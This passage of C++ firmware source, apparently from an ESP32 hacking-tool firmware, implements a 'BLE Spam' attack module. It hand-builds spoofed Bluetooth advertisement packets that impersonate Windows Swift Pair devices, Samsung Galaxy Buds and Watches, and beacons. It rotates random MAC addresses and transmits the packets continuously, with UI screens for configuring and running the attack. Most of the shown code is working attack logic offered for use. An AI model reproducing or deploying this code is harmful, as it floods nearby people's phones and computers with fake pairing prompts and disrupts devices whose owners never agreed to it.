            if (!useSamsung) advertisementData.setFlags(0x06);
            return true;
        }
        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
            int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
            String name;
            if (deviceIndex == nPresets) {
                // Random/All — pick random preset
                name = String(BLE_SPAM_WINDOWS_PRESETS[random(nPresets)]);
            } else if (deviceIndex >= 0 && deviceIndex < nPresets) {
                name = String(BLE_SPAM_WINDOWS_PRESETS[deviceIndex]);
            } else {
                // custom saved name
                name = bleSpamSwiftPairName.length() > 0 ? bleSpamSwiftPairName
                                                         : String(BLE_SPAM_WINDOWS_PRESETS[0]);
            }
            advertisementData = GetUniversalAdvertisementData(Microsoft, name);
            advertisementData.setFlags(0x06);
            return true;
        }
        case BLE_SPAM_ATTACK_SAMSUNG: {
            // Device list: 0=Galaxy Buds, 1=Galaxy Watch, 2=Generic Samsung, 3=Random/All
            BLEAdvertisementData AdvData = BLEAdvertisementData();
            bool sendBuds;
            if (deviceIndex == BLE_SPAM_SAMSUNG_RANDOM_IDX || deviceIndex == 2) {
                // Random/All or Generic — pick randomly each packet
                sendBuds = (random(2) == 0);
            } else if (deviceIndex == 0) {
                sendBuds = true; // Galaxy Buds
            } else {
                sendBuds = false; // Galaxy Watch
            }

            if (sendBuds) {
                uint32_t model = samsung_buds_models[random(samsung_buds_count)];
                uint8_t Buds_Data[31];
                uint8_t bi = 0;
                Buds_Data[bi++] = 27;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x42;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = 0x81;
                Buds_Data[bi++] = 0x02;
                Buds_Data[bi++] = 0x14;
                Buds_Data[bi++] = 0x15;
                Buds_Data[bi++] = 0x03;
                Buds_Data[bi++] = 0x21;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = (model >> 16) & 0xFF;
                Buds_Data[bi++] = (model >> 8) & 0xFF;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = model & 0xFF;
                Buds_Data[bi++] = 0x06;
                Buds_Data[bi++] = 0x3C;
                Buds_Data[bi++] = 0x94;
                Buds_Data[bi++] = 0x8E;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0xC7;
                Buds_Data[bi++] = 0x00;
                // Trailing truncated record (length=0x10 claimed, only 2 data
                // bytes present) — ported from the Flipper Zero ble_spam app.
                // Real Galaxy Buds advertise this stub second record; without
                // it Samsung's scanner doesn't recognize the packet.
                Buds_Data[bi++] = 0x10;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
                AdvData.addData(Buds_Data, bi);
                // Buds_Data already fills the full 31-byte legacy adv payload;
                // there's no room left for a Flags AD element, so don't add one
                // here (setFlags would just fail with "Data length exceeded").
            } else {
                uint8_t model = watch_models[random(watch_models_count)].value;
                uint8_t Watch_Data[15] = {
                    0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
                };
                AdvData.addData(Watch_Data, 15);
                AdvData.setFlags(0x06);
            }
            advertisementData = AdvData;
            return true;
        }
        case BLE_SPAM_ATTACK_BLE_BEACON: {
            advertisementData = BLEAdvertisementData();
            int nBeaconPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
            int randomBeaconIdx = nBeaconPresets;
            String name;
            char randomBuf[17];
            if (deviceIndex >= 0 && deviceIndex < nBeaconPresets) {
                // Preset name
                name = String(BLE_SPAM_BEACON_PRESETS[deviceIndex]);
                bleSpamBeaconName = name;
            } else if (deviceIndex == randomBeaconIdx || bleSpamBeaconName.length() == 0) {
                // Random — generate fresh each packet
                bleSpamRandomBeaconName(randomBuf);
                name = String(randomBuf);
            } else {
                // Custom saved name
                name = bleSpamBeaconName;
            }

            uint8_t packet[31];
            uint8_t i = 0;

            // Flags
            packet[i++] = 0x02;
            packet[i++] = 0x01;
            packet[i++] = 0x06;

            // UUIDs
            packet[i++] = 0x03;
            packet[i++] = 0x03;
            packet[i++] = 0x12;
            packet[i++] = 0x18;

            // Appearance
            packet[i++] = 0x03;
            packet[i++] = 0x19;
            packet[i++] = 0x80;
            packet[i++] = 0x01;

            // Compute remaining space
            uint8_t maxNameLen = 31 - i - 2; // -2 for length + type
            uint8_t nameLen = min((uint8_t)name.length(), maxNameLen);

            // Name
            packet[i++] = nameLen + 1;
            packet[i++] = 0x09;

            memcpy(&packet[i], name.c_str(), nameLen);
            i += nameLen;

            advertisementData.addData(packet, i);
            return true;
        }
        default: return false;
    }
}

static bool bleSpamIsCacheable(BleSpamAttackType attackType) {
    // beacon with empty name = random every packet, never cache
    if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) return false;
    // Apple Pairing and Action both regenerate random fields (battery/encrypted
    // payload/auth tag) on every build call and must not be cached, or the same
    // randomized packet would be replayed forever instead of looking fresh.
    return attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR || attackType == BLE_SPAM_ATTACK_BLE_BEACON;
}

static const BLEAdvertisementData *
bleSpamSelectAdvertisement(BleSpamRunState &state, BleSpamAttackType attackType, int deviceIndex) {
    if (bleSpamIsCacheable(attackType)) {
        if (!state.cached_valid || state.cached_type != attackType ||
            state.cached_device_index != deviceIndex) {
            if (!bleSpamBuildAdvertisementData(attackType, deviceIndex, state.cached_advertisement))
                return nullptr;
            state.cached_type = attackType;
            state.cached_device_index = deviceIndex;
            state.cached_valid = true;
        }
        return &state.cached_advertisement;
    }

    if (!bleSpamBuildAdvertisementData(attackType, deviceIndex, state.working_advertisement)) return nullptr;
    return &state.working_advertisement;
}

// ============================================================================
// BLE Spam Advertiser Functions - FIXED: Always init/deinit
// ============================================================================

static void bleSpamInitAdvertiser(
    BleSpamRunState &state, const BleSpamConfig &config, const uint8_t *mac, bool resetStats
) {
    if (mac) {
        bleSpamSetMac(mac);
        state.mac_initialized = true;
    } else {
        state.mac_initialized = false;
    }

    // FIX: Always init - if already init'd, it's a no-op
    BLEDevice::init("");
    vTaskDelay(5 / portTICK_PERIOD_MS);

    pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
        pAdvertising->setMinInterval(32);
        pAdvertising->setMaxInterval(48);
    }

    bleSpamApplyTxPower(config.tx_power);
    state.applied_power = config.tx_power;
    if (resetStats) {
        state.packet_counter = 0;
        state.sent_count = 0;
        state.window_packets = 0;
        state.window_start_ms = millis();
        state.pkt_s = 0.0f;
    }
    state.adv_active = false;
    state.adv_stop_ms = 0;
    uint32_t now = millis();
    if (resetStats) state.next_send_ms = now;
    else if (state.next_send_ms < now) state.next_send_ms = now;
}

static void bleSpamDeinitAdvertiser() {
    if (pAdvertising) {
        pAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
        pAdvertising = nullptr;
    }
#ifdef CONFIG_BT_NIMBLE_ENABLED
    // NimBLEDevice::m_ownAddrType is a static class member that survives
    // deinit()/init() cycles. bleSpamRestartAdvertiserForMac() flips it to
    // BLE_OWN_ADDR_RANDOM for MAC rotation; every other module's scan/connect/
    // advertise call reads that same static value, so leaving it set breaks
    // all Bluetooth elsewhere in the firmware until a reboot clears statics.
    // This must run BEFORE deinit(): setOwnAddrType() calls into the NimBLE
    // host (ble_hs_id_copy_addr -> ble_npl_mutex_pend), which requires the
    // host task/mutex still be alive. Calling it after deinit() pends on a
    // torn-down mutex and crashes (Load access fault seen on ESP32-C5).
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
#endif
    // FIX: Always deinit - self-contained module
    BLEDevice::deinit();
}

// CHANGED: replaces the old bleSpamRestartAdvertiserForMac which did a full deinit/init.
// Now we only stop advertising, swap the MAC at the interface level and tell the
// NimBLE host (or Bluedroid GAP) about the new address, then let the caller
// restart advertising normally. No stack teardown, no heap churn.
static void
bleSpamRestartAdvertiserForMac(BleSpamRunState &state, const BleSpamConfig &config, const uint8_t *mac) {
    if (pAdvertising) pAdvertising->stop();

    // Set the address at the hardware/interface level first — works for both stacks
    esp_iface_mac_addr_set(mac, ESP_MAC_BT);

#ifdef CONFIG_BT_NIMBLE_ENABLED
    // NimBLE keeps its own copy of the random address in the host layer.
    // ble_hs_id_set_rnd expects bytes in little-endian order (byte 0 = LSB of address).
    // A valid random static address requires the two MSBs of the *most significant byte*
    // (which is byte[5] in big-endian / byte[0] in little-endian) to be set to 11.
    uint8_t addr_le[6];
    addr_le[0] = mac[5] | 0xC0; // MSB of address with random static bits set
    addr_le[1] = mac[4];
    addr_le[2] = mac[3];
    addr_le[3] = mac[2];
    addr_le[4] = mac[1];
    addr_le[5] = mac[0];
    ble_hs_id_set_rnd(addr_le);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
#else
    // Bluedroid: the GAP API handles the random address directly.
    // Same MSB requirement applies.
    uint8_t addr[6];
    memcpy(addr, mac, 6);
    addr[5] |= 0xC0;
    esp_ble_gap_set_rand_addr(addr);
#endif

    state.mac_initialized = true;
    // pAdvertising is still valid — caller proceeds straight to start()
}

static void
bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSpamSelection &selection) {
    uint32_t now = millis();
    static BLEAdvertisementData emptyScanResponse = BLEAdvertisementData();

    if (state.adv_active && now >= state.adv_stop_ms) {
        if (pAdvertising) pAdvertising->stop();
        state.adv_active = false;
    }

    if (!state.adv_active && now >= state.next_send_ms && pAdvertising) {
        BleSpamAttackType attackType = selection.attack_type;
        int deviceIndex = selection.device_index;

        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
            bleSpamPickRandomSelection(attackType, deviceIndex);
        }

        uint8_t nextMac[6];
        if (bleSpamGetNextMac(state, config.mac_rand_mode, nextMac)) {
            bleSpamRestartAdvertiserForMac(state, config, nextMac);
        }

        if (!pAdvertising) return;

        // For beacon random spam, force a stop before setting new data so NimBLE
        // flushes the payload and picks up the new name every packet
        if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) {
            pAdvertising->stop();
        }

        const BLEAdvertisementData *advertisementData =
            bleSpamSelectAdvertisement(state, attackType, deviceIndex);
        if (!advertisementData) return;

        pAdvertising->setAdvertisementData(*advertisementData);
        pAdvertising->setScanResponseData(emptyScanResponse);
        pAdvertising->start();

        state.adv_active = true;
        state.adv_stop_ms = now + config.adv_ms;
        state.next_send_ms = now + config.adv_ms + config.gap_ms;
        state.packet_counter++;
        state.sent_count++;
        state.window_packets++;
    }
}

static void bleSpamUpdateStats(BleSpamRunState &state) {
    uint32_t now = millis();
    if (now - state.window_start_ms >= BLE_SPAM_STATS_UPDATE_MS) {
        state.pkt_s = state.window_packets / 0.5f;
        state.window_packets = 0;
        state.window_start_ms = now;
    }
}

static String bleSpamFormatMs(uint32_t ms) { return String(ms) + " ms"; }

static void bleSpamRenderConfigRows(
    const BleSpamConfig &config, int cursor, const BleSpamEditState &editState, int startY, int rowH
) {
    tft.setTextSize(FP);

    struct RowInfo {
        const char *label;
        String value;
    } rows[] = {
        {"Adv ms",   bleSpamFormatMs(config.adv_ms)           },
        {"Gap ms",   bleSpamFormatMs(config.gap_ms)           },
        {"TX Power", bleSpamTxPowerLabel(config.tx_power)     },
        {"MAC Rand", bleSpamMacRandLabel(config.mac_rand_mode)}
    };

    for (int i = 0; i < 4; i++) {
        int rowY = startY + i * rowH;
        bool selected = (cursor == i);
        bool editing = (editState.editing && editState.edit_row == i);

        tft.fillRect(10, rowY, tftWidth - 20, rowH, bruceConfig.bgColor);
        uint16_t fg = selected ? TFT_YELLOW : bruceConfig.priColor;
        tft.setTextColor(fg, bruceConfig.bgColor);
        tft.drawString(rows[i].label, 12, rowY + 2, 1);

        String valueText = rows[i].value;
        if (editing) valueText = "[ " + valueText + " ]";
        tft.drawRightString(valueText, tftWidth - 12, rowY + 2, 1);
    }
}

static bool
bleSpamConfigScreen(const BleSpamSelection &selection, BleSpamConfig &config, bool &configChanged) {
    BleSpamEditState editState;
    int cursor = 0;
    bool layoutDrawn = false;
    bool redrawRows = true;

    while (true) {
        if (!layoutDrawn) {
            String title =
                String(bleSpamGetDeviceName(selection.attack_type, selection.device_index)) + " > Config";
            drawMainBorderWithTitle(bleSpamMakeTitle(title));
            layoutDrawn = true;
            redrawRows = true;
        }

        if (redrawRows) {
            int rowStart = BORDER_PAD_Y + FM * LH + 10;
            int footerH = FP * LH + 4;
            int footerY = tftHeight - footerH - 8;
            int available = footerY - rowStart - 4;
            int rowH = max(1, min(FP * LH + 4, available / 5));
            int startRowY = rowStart + rowH * 4;

            bleSpamRenderConfigRows(config, cursor, editState, rowStart, rowH);

            tft.fillRect(10, startRowY, tftWidth - 20, rowH, bruceConfig.bgColor);
            uint16_t startColor = (cursor == 4) ? TFT_YELLOW : bruceConfig.priColor;
            tft.setTextColor(startColor, bruceConfig.bgColor);
            tft.drawCentreString("[ Start ]", tftWidth / 2, startRowY + 2, 1);

            tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
            tft.fillRect(8, footerY, tftWidth - 16, footerH, bruceConfig.bgColor);
            tft.drawCentreString("Click=Select  ESC=Back", tftWidth / 2, footerY + 2, 1);

            redrawRows = false;
        }

        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) {
            if (editState.editing) {
                switch (editState.edit_row) {
                    case 0: config.adv_ms = editState.adv_backup; break;
                    case 1: config.gap_ms = editState.gap_backup; break;
                    case 2: config.tx_power = editState.tx_backup; break;
                    case 3: config.mac_rand_mode = editState.mac_backup; break;
                }
                editState.editing = false;
                redrawRows = true;
            } else {
                return false;
            }
        }

        if (check(SelPress)) {
            if (editState.editing) {
                editState.editing = false;
                redrawRows = true;
            } else {
                if (cursor == 4) return true;
                editState.editing = true;
                editState.edit_row = cursor;
                editState.adv_backup = config.adv_ms;
                editState.gap_backup = config.gap_ms;
                editState.tx_backup = config.tx_power;
                editState.mac_backup = config.mac_rand_mode;
                redrawRows = true;
            }
        }

        if (editState.editing) {
            if (check(NextPress)) {
                if (editState.edit_row == 0) {
                    config.adv_ms = bleSpamAdjustMs(config.adv_ms, 1);
                    configChanged = true;
                } else if (editState.edit_row == 1) {
                    config.gap_ms = bleSpamAdjustMs(config.gap_ms, 1);
                    configChanged = true;
                } else if (editState.edit_row == 2) {
                    config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 3) % 4);
                    configChanged = true;
                } else if (editState.edit_row == 3) {
                    config.mac_rand_mode = static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 1) % 8);
                    configChanged = true;
                }
                redrawRows = true;
            } else if (check(PrevPress)) {
                if (editState.edit_row == 0) {
                    config.adv_ms = bleSpamAdjustMs(config.adv_ms, -1);
                    configChanged = true;
                } else if (editState.edit_row == 1) {
                    config.gap_ms = bleSpamAdjustMs(config.gap_ms, -1);
                    configChanged = true;
                } else if (editState.edit_row == 2) {
                    config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 1) % 4);
                    configChanged = true;
                } else if (editState.edit_row == 3) {
                    config.mac_rand_mode = static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 7) % 8);
                    configChanged = true;
                }
                redrawRows = true;
            }
        } else {
            if (check(NextPress)) {
                cursor = (cursor + 1) % 5;
                redrawRows = true;
            } else if (check(PrevPress)) {
                cursor = (cursor + 4) % 5;
                redrawRows = true;
            }
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

static void bleSpamRenderRunningScreen(
    const BleSpamSelection &selection, const BleSpamConfig &config, int cursor,
    const BleSpamEditState &editState, uint32_t displaySent, float displayPkt, bool blinkOn, bool fullRedraw,
    bool statsDirty, bool configDirty, bool blinkDirty
) {
    static int statsY = 0;
    static int configStartY = 0;
    static int rowH = 0;

    if (fullRedraw) {
        String title = bleSpamGetDeviceName(selection.attack_type, selection.device_index);
        drawMainBorderWithTitle(bleSpamMakeTitle(title));

        statsY = BORDER_PAD_Y + FM * LH + 8;
        int footerH = FP * LH + 4;
        int footerY = tftHeight - footerH - 8;
        int sepGap = 4;
        int available = footerY - statsY - sepGap - 2;
        rowH = max(1, min(FP * LH + 4, available / 6));
        configStartY = statsY + rowH * 2 + sepGap;

        tft.drawFastHLine(8, statsY + rowH * 2 - 2, tftWidth - 16, bruceConfig.priColor);
        tft.drawFastHLine(8, configStartY + rowH * 4 - 2, tftWidth - 16, bruceConfig.priColor);

        tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
        tft.fillRect(8, footerY, tftWidth - 16, footerH, bruceConfig.bgColor);
        tft.drawCentreString("Click=Edit  ESC=Stop", tftWidth / 2, footerY + 2, 1);
    }

    if (blinkDirty) {
        tft.setTextSize(FP);
        tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
        int starX = tftWidth - 18;
        int starY = BORDER_PAD_Y + 2;
        tft.fillRect(starX - 2, starY - 2, 12, 12, bruceConfig.bgColor);
        tft.drawString(blinkOn ? "*" : " ", starX, starY, 1);
    }

    if (statsDirty) {
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

        tft.fillRect(10, statsY, tftWidth - 20, rowH * 2, bruceConfig.bgColor);
        char buf[24];
        snprintf(buf, sizeof(buf), "Sent:   %06lu", (unsigned long)displaySent);
        tft.drawString(buf, 12, statsY + 2, 1);

        snprintf(buf, sizeof(buf), "Pkt/s:  %.1f", displayPkt);
        tft.drawString(buf, 12, statsY + rowH + 2, 1);
    }

    if (configDirty) {
        BleSpamEditState viewEdit = editState;
        int drawCursor = cursor;
        bleSpamRenderConfigRows(config, drawCursor, viewEdit, configStartY, rowH);
    }
}

static bool bleSpamStoppedPrompt(const BleSpamSelection &selection, uint32_t sentCount) {
    int cursor = 0;
    bool redraw = true;
    bool layoutDrawn = false;
    const char *options[] = {"Restart", "Back to Config"};
    int optionCount = 2;

    while (true) {
        if (redraw) {
            if (!layoutDrawn) {
                String title =
                    String(bleSpamGetDeviceName(selection.attack_type, selection.device_index)) + " STOPPED";
                drawMainBorderWithTitle(bleSpamMakeTitle(title));

                tft.setTextSize(FP);
                char buf[32];
                snprintf(buf, sizeof(buf), "Sent: %06lu  Pkt/s: 0.0", (unsigned long)sentCount);
                int statsY = BORDER_PAD_Y + FM * LH + 8;
                tft.fillRect(10, statsY, tftWidth - 20, FP * LH + 6, bruceConfig.bgColor);
                tft.drawString(buf, 12, statsY + 2, 1);

                tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
                int footerY = tftHeight - FP * LH - 12;
                tft.fillRect(8, footerY, tftWidth - 16, FP * LH + 4, bruceConfig.bgColor);
                tft.drawCentreString("Click=Select  ESC=Back", tftWidth / 2, footerY + 2, 1);
                layoutDrawn = true;
            }

            int rowH = max(12, FP * LH + 4);
            int listY = BORDER_PAD_Y + FM * LH + 8 + rowH * 2;
            for (int i = 0; i < optionCount; i++) {
                int rowY = listY + i * rowH;
                bool selected = (i == cursor);
                uint16_t bg = selected ? bruceConfig.priColor : bruceConfig.bgColor;
                uint16_t fg = selected ? bruceConfig.bgColor : bruceConfig.priColor;
                tft.fillRect(10, rowY, tftWidth - 20, rowH, bg);
                tft.setTextColor(fg, bg);
                tft.drawString(String(selected ? "> " : "  ") + options[i], 12, rowY + 2, 1);
            }

            redraw = false;
        }

        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) return false;

        if (check(NextPress)) {
            cursor = (cursor + 1) % optionCount;
            redraw = true;
        } else if (check(PrevPress)) {
            cursor = (cursor + optionCount - 1) % optionCount;
            redraw = true;
        } else if (check(SelPress)) {
            return (cursor == 0);
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &config) {
    bool restart = false;
    do {
        BleSpamRunState runState;
        uint8_t initialMac[6];
        bool haveMac = bleSpamGetNextMac(runState, config.mac_rand_mode, initialMac);
        bleSpamInitAdvertiser(runState, config, haveMac ? initialMac : nullptr, true);

        BleSpamEditState editState;
        editState.editing = false;
        editState.edit_row = 0;
        int cursor = 0;
        bool running = true;
        bool fullRedraw = true;
        bool statsDirty = true;
        bool configDirty = true;
        bool blinkDirty = true;
        bool blinkOn = false;
        uint32_t lastBlink = millis();
        uint32_t lastStatsUpdate = millis();
        uint32_t displaySent = 0;
        float displayPkt = 0.0f;

        while (running) {
            bleSpamSendTick(runState, config, selection);
            bleSpamUpdateStats(runState);

            uint32_t now = millis();
            if (now - lastStatsUpdate >= BLE_SPAM_STATS_UPDATE_MS) {
                displaySent = runState.sent_count;
                displayPkt = runState.pkt_s;
                statsDirty = true;
                lastStatsUpdate = now;
            }

            if (now - lastBlink >= BLE_SPAM_BLINK_MS) {
                blinkOn = !blinkOn;
                blinkDirty = true;
                lastBlink = now;
            }

            if (EscPress && PrevPress) EscPress = false;
            if (check(EscPress)) {
                if (editState.editing) {
                    switch (editState.edit_row) {
                        case 0: config.adv_ms = editState.adv_backup; break;
                        case 1: config.gap_ms = editState.gap_backup; break;
                        case 2: config.tx_power = editState.tx_backup; break;
                        case 3: config.mac_rand_mode = editState.mac_backup; break;
                    }
                    editState.editing = false;
                    configDirty = true;
                } else {
                    running = false;
                }
            }

            if (check(SelPress)) {
                if (editState.editing) {
                    if (editState.edit_row == 2) {
                        bleSpamApplyTxPower(config.tx_power);
                        runState.applied_power = config.tx_power;
                    }
                    if (editState.edit_row == 0 || editState.edit_row == 1) {
                        runState.next_send_ms = millis() + config.adv_ms + config.gap_ms;
                    }
                    editState.editing = false;
                    configDirty = true;
                } else {
                    editState.editing = true;
                    editState.edit_row = cursor;
                    editState.adv_backup = config.adv_ms;
                    editState.gap_backup = config.gap_ms;
                    editState.tx_backup = config.tx_power;
                    editState.mac_backup = config.mac_rand_mode;
                    configDirty = true;
                }
            }

            if (editState.editing) {
                if (check(NextPress)) {
                    if (editState.edit_row == 0) {
                        config.adv_ms = bleSpamAdjustMs(config.adv_ms, 1);
                    } else if (editState.edit_row == 1) {
                        config.gap_ms = bleSpamAdjustMs(config.gap_ms, 1);
                    } else if (editState.edit_row == 2) {
                        config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 3) % 4);
                    } else if (editState.edit_row == 3) {
                        config.mac_rand_mode =
                            static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 1) % 8);
                        runState.mac_initialized = false;
                    }
                    configDirty = true;
                } else if (check(PrevPress)) {
                    if (editState.edit_row == 0) {
                        config.adv_ms = bleSpamAdjustMs(config.adv_ms, -1);
                    } else if (editState.edit_row == 1) {
                        config.gap_ms = bleSpamAdjustMs(config.gap_ms, -1);
                    } else if (editState.edit_row == 2) {
                        config.tx_power = static_cast<BleSpamTxPower>((config.tx_power + 1) % 4);
                    } else if (editState.edit_row == 3) {
                        config.mac_rand_mode =
                            static_cast<BleSpamMacRandMode>((config.mac_rand_mode + 7) % 8);
                        runState.mac_initialized = false;
                    }
                    configDirty = true;
                }
            } else {
                if (check(NextPress)) {
                    cursor = (cursor + 1) % 4;
                    configDirty = true;
                } else if (check(PrevPress)) {
                    cursor = (cursor + 3) % 4;
                    configDirty = true;
                }
            }

            bleSpamRenderRunningScreen(
                selection,
                config,
                cursor,
                editState,
                displaySent,
                displayPkt,
                blinkOn,
                fullRedraw,
                statsDirty,
                configDirty,
                blinkDirty
            );

            fullRedraw = false;
            statsDirty = false;
            configDirty = false;
            blinkDirty = false;
            vTaskDelay(pdMS_TO_TICKS(1));
        }

        bleSpamDeinitAdvertiser();
        restart = bleSpamStoppedPrompt(selection, runState.sent_count);
    } while (restart);
}

// Show a 2-option popup. Returns 0 for first option, 1 for second, -1 for ESC.
static int bleSpamTwoOptionPrompt(const String &title, const char *opt0, const char *opt1) {
    int cursor = 0;
    bool redraw = true;
    bool layoutDrawn = false;
    while (true) {
        if (redraw) {
            if (!layoutDrawn) {
                drawMainBorderWithTitle(bleSpamMakeTitle(title));
                layoutDrawn = true;
            }
            int rowH = max(12, FP * LH + 4);
            int startY = BORDER_PAD_Y + FM * LH + 16;
            for (int i = 0; i < 2; i++) {
                int rowY = startY + i * rowH;
                bool sel = (i == cursor);
                uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
                uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
                tft.fillRect(10, rowY, tftWidth - 20, rowH, bg);
                tft.setTextColor(fg, bg);
                tft.setTextSize(FP);
                tft.drawString(String(sel ? "> " : "  ") + (i == 0 ? opt0 : opt1), 14, rowY + 2, 1);
            }
            redraw = false;
        }
        if (EscPress && PrevPress) EscPress = false;
        if (check(EscPress)) return -1;
        if (check(NextPress)) {
            cursor = (cursor + 1) % 2;
            redraw = true;
        } else if (check(PrevPress)) {
            cursor = (cursor + 1) % 2;
            redraw = true;
        } else if (check(SelPress)) return cursor;
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// Handle device selection for types with custom name lists (Swift Pair and Beacon)
// Returns true if a device/name was chosen and selection is ready to run.
// Sets bleSpamSwiftPairName / bleSpamBeaconName as side-effect.
static bool bleSpamHandleCustomNameDevice(
    BleSpamAttackType type, int deviceIndex, BleSpamSelection &selection, BleSpamConfig &config,
    bool &configChanged
) {
    const char *ns = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? "bs_sp" : "bs_bn";
    String &nameVar = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? bleSpamSwiftPairName : bleSpamBeaconName;

    int nPresets = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR)
                       ? (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))
                       : (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
    int randomIdx = nPresets; // Random/All is always right after presets
    int savedBase = nPresets + 1;

    std::vector<String> saved = bleSpamLoadCustomNames(ns);
    int addNewIdx = savedBase + (int)saved.size();

    if (deviceIndex == addNewIdx) {
        // User tapped "+ Add New Custom Name"
        String newName = keyboard("", 24, "Enter name");
        if (newName == "\x1B" || newName.length() == 0) return false;
        saved.push_back(newName);
        bleSpamSaveCustomNames(ns, saved);
        nameVar = newName;
        selection.device_index = deviceIndex;
        vTaskDelay(200 / portTICK_PERIOD_MS); // debounce — prevent stale press escaping to list
        return false;                         // return to device list, not to spam menu
    }

    if (deviceIndex >= savedBase && deviceIndex < addNewIdx) {
        // It's a saved custom name — show Use/Delete prompt
        int choice = bleSpamTwoOptionPrompt(
            String(saved[deviceIndex - savedBase]), "Use Saved Name", "Delete Saved Name"
        );
        if (choice == 1) {
            // Delete
            saved.erase(saved.begin() + (deviceIndex - savedBase));
            bleSpamSaveCustomNames(ns, saved);
            return false;
        } else if (choice == 0) {
            nameVar = saved[deviceIndex - savedBase];
            selection.device_index = deviceIndex;
            return true; // proceed to config+run
        }
        return false;
    }

    // Preset or Random/All — clear custom name var, just run
    nameVar = "";
    selection.device_index = deviceIndex;
    return true;
}

static void bleSpamMenuUi() {
    BleSpamConfig config = bleSpamLoadConfig();
    bool configChanged = false;

    while (true) {
        int attackIndex = bleSpamListLoop(
            "BLE Spam",
            bleSpamGetAttackOptionCount(),
            0,
            [](int idx) { return bleSpamGetAttackLabel(idx); },
            "Click=Select  ESC=Back"
        );

        if (attackIndex < 0) return;

        BleSpamSelection selection;
        selection.attack_type = bleSpamGetAttackTypeByIndex(attackIndex);
        selection.device_index = 0;

        // Types that go straight to config without a device list
        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
            while (true) {
                bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
                bleSpamSaveConfig(config);
                configChanged = false;
                if (!startAttack) break;
                bleSpamRunScreen(selection, config);
            }
            continue;
        }

        // Types with a device/name list
        while (true) {
            int deviceCount = bleSpamGetDeviceCount(selection.attack_type);
            int deviceIndex = bleSpamListLoop(
                String(bleSpamGetAttackLabel(attackIndex)) + " > Device",
                deviceCount,
                0,
                [&](int idx) { return bleSpamGetDeviceName(selection.attack_type, idx); },
                "Click=Select  ESC=Back"
            );

            if (deviceIndex < 0) break;

            // Swift Pair and Beacon need custom name handling
            if (selection.attack_type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR ||
                selection.attack_type == BLE_SPAM_ATTACK_BLE_BEACON) {
                bool readyToRun = bleSpamHandleCustomNameDevice(
                    selection.attack_type, deviceIndex, selection, config, configChanged
                );
                if (!readyToRun) continue;
            } else {
                selection.device_index = deviceIndex;
            }

            while (true) {
                bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
                bleSpamSaveConfig(config);
                configChanged = false;
                if (!startAttack) break;
                bleSpamRunScreen(selection, config);
            }
        }
    }
}

void spamMenu() { bleSpamMenuUi(); }
